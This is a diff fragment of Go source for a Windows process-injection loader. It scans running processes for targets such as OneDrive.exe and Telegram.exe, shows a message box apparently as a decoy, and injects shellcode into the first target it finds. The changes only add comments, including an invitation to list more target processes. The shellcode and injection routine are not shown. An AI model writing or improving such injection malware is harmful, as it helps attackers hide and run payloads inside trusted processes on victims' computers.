@@ -34,6 +34,8 @@ func getpid() uint32 {
     sz := uint32(1000)
     procs := make([]uint32, sz)
     var bytesReturned uint32
+    
+    // enter target processes here, the more the better..
     target_procs := []string{"OneDrive.exe", "Telegram.exe", "Spotify.exe", "Messenger.exe"}
     for _,proc := range target_procs {
         if w32.EnumProcesses(procs, sz, &bytesReturned) {
@@ -81,13 +83,14 @@ func main() {
     go messagebox()
 
     for {
-        // scan for running process; once one is found-
-        // inject shellcode into the process space and break infinite loop
+        // recursively scan for a running target process; once one is found-
+        // inject shellcode into the process space and break infinite for loop
         pid := getpid()
         if pid > 0 {
             inject(shellcode, pid)
             break
         } else {
+            // sleep to limit cpu usage
             time.Sleep(1 * time.Second)
         }
     }
